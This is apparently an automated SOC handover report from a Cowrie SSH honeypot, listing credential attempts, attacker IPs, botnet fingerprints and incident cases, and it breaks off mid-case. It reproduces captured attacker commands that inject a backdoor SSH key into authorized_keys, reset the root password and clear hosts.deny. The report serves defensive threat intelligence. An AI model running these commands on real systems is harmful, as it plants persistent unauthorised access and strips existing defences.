# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-14 |
| **Generated At** | 2026-06-14T12:01:36Z |
| **Shift Time** | 12:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **254** |
| Confirmed Threats | **251** |
| False Positives Filtered | **3** (1.2%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **13** |
| High Severity Cases | **38** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **216** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **86** |
| Unique Credential Pairs | **50** |
| Unique Usernames | **29** |
| Unique Passwords | **47** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 38 |
| `345gs5662d34` | 18 |
| `mega` | 3 |
| `ubuntu` | 2 |
| `devuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 18 |
| `123456` | 4 |
| `123` | 3 |
| `Pass@2026` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `root` | `3245gs5662d34` | 18 |
| `mega` | `123` | 3 |
| `root` | `Pass@2026` | 1 |
| `root` | `qwerty555` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Pass@2026` | `103.59.163.132` | 2026-06-14T09:40:25 |
| `root` | `3245gs5662d34` | `103.59.163.132` | 2026-06-14T09:40:32 |
| `root` | `qwerty555` | `36.50.134.129` | 2026-06-14T09:41:49 |
| `root` | `3245gs5662d34` | `36.50.134.129` | 2026-06-14T09:41:53 |
| `root` | `abc123!!!` | `114.29.11.190` | 2026-06-14T09:42:23 |
| `root` | `3245gs5662d34` | `114.29.11.190` | 2026-06-14T09:42:27 |
| `root` | `A123456789!` | `36.50.134.129` | 2026-06-14T09:44:05 |
| `root` | `Lai123456` | `43.133.61.150` | 2026-06-14T10:45:04 |
| `root` | `3245gs5662d34` | `43.133.61.150` | 2026-06-14T10:45:07 |
| `root` | `eSER!@#` | `192.227.213.228` | 2026-06-14T10:46:59 |
| `root` | `3245gs5662d34` | `192.227.213.228` | 2026-06-14T10:47:12 |
| `root` | `1234567899` | `43.133.61.150` | 2026-06-14T10:48:38 |
| `root` | `xsw2!QAZ` | `192.227.213.228` | 2026-06-14T11:11:25 |
| `root` | `A123456789` | `167.172.93.203` | 2026-06-14T11:41:22 |
| `root` | `3245gs5662d34` | `167.172.93.203` | 2026-06-14T11:41:24 |
| `root` | `jf@123456` | `14.103.123.232` | 2026-06-14T11:43:01 |
| `root` | `a111222` | `167.172.93.203` | 2026-06-14T11:43:32 |
| `root` | `Root2024` | `42.51.33.162` | 2026-06-14T11:45:03 |
| `root` | `Ss123321..` | `103.189.234.96` | 2026-06-14T11:51:09 |
| `root` | `3245gs5662d34` | `103.189.234.96` | 2026-06-14T11:51:11 |
| `root` | `Admin123123123` | `186.68.83.105` | 2026-06-14T11:53:53 |
| `root` | `passwordlinux` | `167.172.93.203` | 2026-06-14T11:53:54 |
| `root` | `3245gs5662d34` | `186.68.83.105` | 2026-06-14T11:54:00 |
| `root` | `amit` | `186.68.83.105` | 2026-06-14T11:55:55 |
| `root` | `mko0(IJN` | `42.51.33.162` | 2026-06-14T11:56:34 |
| `root` | `3245gs5662d34` | `42.51.33.162` | 2026-06-14T11:56:38 |
| `root` | `test@2026` | `124.155.125.131` | 2026-06-14T11:56:56 |
| `root` | `3245gs5662d34` | `124.155.125.131` | 2026-06-14T11:57:00 |
| `root` | `KS@gshyx@zl1651` | `186.68.83.105` | 2026-06-14T11:57:57 |
| `root` | `mudar123` | `167.172.93.203` | 2026-06-14T11:58:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **254** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 93 |
| Go SSH scanner | 3 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 83 | 11 |
| `03a80b21afa8...` | Modern SSH client | 6 | 4 |
| `16443846184e...` | Generic scanner | 2 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 83 | 11 | Mirai/variant |
| `03a80b21afa8...` | libssh | 6 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:GkEyZxguSxTv"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `42.51.33.162`, `14.103.123.232`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `167.172.93.203`, `103.189.234.96`, `36.50.134.129`, `43.133.61.150`, `114.29.11.190`, `186.68.83.105`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **27** |
| High-Risk ASNs | **25** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS398101` | GoDaddy.com, LLC | 2 | HIGH |
| `AS56005` | Zhengzhou Fastidc Technology Co.,Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS211298` | Driftnet Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (38)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-be812658e6a4

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]132` |
| **First Seen** | 2026-06-14 09:40 |
| **Last Seen** | 2026-06-14 09:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:40:24` | `cowrie.session.connect` |
| `2026-06-14 09:40:24` | `cowrie.client.version` |
| `2026-06-14 09:40:24` | `cowrie.client.kex` |
| `2026-06-14 09:40:25` | `cowrie.login.success` |
| `2026-06-14 09:40:26` | `cowrie.session.params` |
| `2026-06-14 09:40:26` | `cowrie.command.input` |
| `2026-06-14 09:40:26` | `cowrie.command.failed` |
| `2026-06-14 09:40:27` | `cowrie.log.closed` |
| `2026-06-14 09:40:27` | `cowrie.session.params` |
| `2026-06-14 09:40:27` | `cowrie.command.input` |
| `2026-06-14 09:40:28` | `cowrie.session.file_download` |
| `2026-06-14 09:40:28` | `cowrie.log.closed` |
| `2026-06-14 09:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bdca799ca78

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]132` |
| **First Seen** | 2026-06-14 09:40 |
| **Last Seen** | 2026-06-14 09:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:40:30` | `cowrie.session.connect` |
| `2026-06-14 09:40:30` | `cowrie.client.version` |
| `2026-06-14 09:40:30` | `cowrie.client.kex` |
| `2026-06-14 09:40:32` | `cowrie.login.success` |
| `2026-06-14 09:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7d7c13b1b0

| Field | Detail |
|---|---|
| **Source IP** | `36.50.134[.]129` |
| **First Seen** | 2026-06-14 09:41 |
| **Last Seen** | 2026-06-14 09:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:41:49` | `cowrie.session.connect` |
| `2026-06-14 09:41:49` | `cowrie.client.version` |
| `2026-06-14 09:41:49` | `cowrie.client.kex` |
| `2026-06-14 09:41:49` | `cowrie.login.success` |
| `2026-06-14 09:41:50` | `cowrie.session.params` |
| `2026-06-14 09:41:50` | `cowrie.command.input` |
| `2026-06-14 09:41:50` | `cowrie.command.failed` |
| `2026-06-14 09:41:50` | `cowrie.log.closed` |
| `2026-06-14 09:41:50` | `cowrie.session.params` |
| `2026-06-14 09:41:50` | `cowrie.command.input` |
| `2026-06-14 09:41:50` | `cowrie.session.file_download` |
| `2026-06-14 09:41:50` | `cowrie.log.closed` |
| `2026-06-14 09:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.134[.]129` to AbuseIPDB if not already reported
- [ ] Block `36.50.134[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9ae6726836

| Field | Detail |
|---|---|
| **Source IP** | `36.50.134[.]129` |
| **First Seen** | 2026-06-14 09:41 |
| **Last Seen** | 2026-06-14 09:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:41:52` | `cowrie.session.connect` |
| `2026-06-14 09:41:52` | `cowrie.client.version` |
| `2026-06-14 09:41:52` | `cowrie.client.kex` |
| `2026-06-14 09:41:53` | `cowrie.login.success` |
| `2026-06-14 09:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.134[.]129` to AbuseIPDB if not already reported
- [ ] Block `36.50.134[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1004b22145

| Field | Detail |
|---|---|
| **Source IP** | `114.29.11[.]190` |
| **First Seen** | 2026-06-14 09:42 |
| **Last Seen** | 2026-06-14 09:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:42:22` | `cowrie.session.connect` |
| `2026-06-14 09:42:22` | `cowrie.client.version` |
| `2026-06-14 09:42:23` | `cowrie.client.kex` |
| `2026-06-14 09:42:23` | `cowrie.login.success` |
| `2026-06-14 09:42:23` | `cowrie.session.params` |
| `2026-06-14 09:42:23` | `cowrie.command.input` |
| `2026-06-14 09:42:23` | `cowrie.command.failed` |
| `2026-06-14 09:42:24` | `cowrie.log.closed` |
| `2026-06-14 09:42:24` | `cowrie.session.params` |
| `2026-06-14 09:42:24` | `cowrie.command.input` |
| `2026-06-14 09:42:24` | `cowrie.session.file_download` |
| `2026-06-14 09:42:24` | `cowrie.log.closed` |
| `2026-06-14 09:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.29.11[.]190` to AbuseIPDB if not already reported
- [ ] Block `114.29.11[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f578d260fd2a

| Field | Detail |
|---|---|
| **Source IP** | `114.29.11[.]190` |
| **First Seen** | 2026-06-14 09:42 |
| **Last Seen** | 2026-06-14 09:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:42:26` | `cowrie.session.connect` |
| `2026-06-14 09:42:26` | `cowrie.client.version` |
| `2026-06-14 09:42:26` | `cowrie.client.kex` |
| `2026-06-14 09:42:27` | `cowrie.login.success` |
| `2026-06-14 09:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.29.11[.]190` to AbuseIPDB if not already reported
- [ ] Block `114.29.11[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e84925d90f0

| Field | Detail |
|---|---|
| **Source IP** | `36.50.134[.]129` |
| **First Seen** | 2026-06-14 09:44 |
| **Last Seen** | 2026-06-14 09:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:44:04` | `cowrie.session.connect` |
| `2026-06-14 09:44:04` | `cowrie.client.version` |
| `2026-06-14 09:44:04` | `cowrie.client.kex` |
| `2026-06-14 09:44:05` | `cowrie.login.success` |
| `2026-06-14 09:44:05` | `cowrie.session.params` |
| `2026-06-14 09:44:05` | `cowrie.command.input` |
| `2026-06-14 09:44:05` | `cowrie.command.failed` |
| `2026-06-14 09:44:05` | `cowrie.log.closed` |
| `2026-06-14 09:44:05` | `cowrie.session.params` |
| `2026-06-14 09:44:05` | `cowrie.command.input` |
| `2026-06-14 09:44:06` | `cowrie.session.file_download` |
| `2026-06-14 09:44:06` | `cowrie.log.closed` |
| `2026-06-14 09:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.134[.]129` to AbuseIPDB if not already reported
- [ ] Block `36.50.134[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c32962ead0a4

| Field | Detail |
|---|---|
| **Source IP** | `36.50.134[.]129` |
| **First Seen** | 2026-06-14 09:44 |
| **Last Seen** | 2026-06-14 09:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 09:44:07` | `cowrie.session.connect` |
| `2026-06-14 09:44:07` | `cowrie.client.version` |
| `2026-06-14 09:44:08` | `cowrie.client.kex` |
| `2026-06-14 09:44:08` | `cowrie.login.success` |
| `2026-06-14 09:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.50.134[.]129` to AbuseIPDB if not already reported
- [ ] Block `36.50.134[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c932ac8e2139

| Field | Detail |
|---|---|
| **Source IP** | `43.133.61[.]150` |
| **First Seen** | 2026-06-14 10:45 |
| **Last Seen** | 2026-06-14 10:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 10:45:04` | `cowrie.session.connect` |
| `2026-06-14 10:45:04` | `cowrie.client.version` |
| `2026-06-14 10:45:04` | `cowrie.client.kex` |
| `2026-06-14 10:45:04` | `cowrie.login.success` |
| `2026-06-14 10:45:05` | `cowrie.session.params` |
| `2026-06-14 10:45:05` | `cowrie.command.input` |
| `2026-06-14 10:45:05` | `cowrie.command.failed` |
| `2026-06-14 10:45:05` | `cowrie.log.closed` |
| `2026-06-14 10:45:05` | `cowrie.session.params` |
| `2026-06-14 10:45:05` | `cowrie.command.input` |
| `2026-06-14 10:45:05` | `cowrie.session.file_download` |
| `2026-06-14 10:45:05` | `cowrie.log.closed` |
| `2026-06-14 10:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.61[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.133.61[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c26b593acfb5

| Field | Detail |
|---|---|
| **Source IP** | `43.133.61[.]150` |
| **First Seen** | 2026-06-14 10:45 |
| **Last Seen** | 2026-06-14 10:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 10:45:06` | `cowrie.session.connect` |
| `2026-06-14 10:45:06` | `cowrie.client.version` |
| `2026-06-14 10:45:06` | `cowrie.client.kex` |
| `2026-06-14 10:45:07` | `cowrie.login.success` |
| `2026-06-14 10:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.133.61[.]150` to AbuseIPDB if not already reported
- [ ] Block `43.133.61[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5780280dc688

| Field | Detail |
|---|---|
| **Source IP** | `192.227.213[.]228` |
| **First Seen** | 2026-06-14 10:46 |
| **Last Seen** | 2026-06-14 10:47 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 10:46:57` | `cowrie.session.connect` |
| `2026-06-14 10:46:57` | `cowrie.client.version` |
| `2026-06-14 10:46:57` | `cowrie.client.kex` |
| `2026-06-14 10:46:59` | `cowrie.login.success` |
| `2026-06-14 10:46:59` | `cowrie.session.params` |
| `2026-06-14 10:46:59` | `cowrie.command.input` |
| `2026-06-14 10:46:59` | `cowrie.command.failed` |
| `2026-06-14 10:47:00` | `cowrie.log.closed` |
| `2026-06-14 10:47:00` | `cowrie.session.params` |
| `2026-06-14 10:47:00` | `cowrie.command.input` |
| `2026-06-14 10:47:01` | `cowrie.session.file_download` |
| `2026-06-14 10:47:01` | `cowrie.log.closed` |
| `2026-06-14 10:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.227.213[.]228` to AbuseIPDB if not already reported
- [ ] Block `192.227.213[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afbfacf184ea

| Field | Detail |
|---|---|
| **Source IP** | `192.227.213[.]228` |
| **First Seen** | 2026-06-14 10:47 |
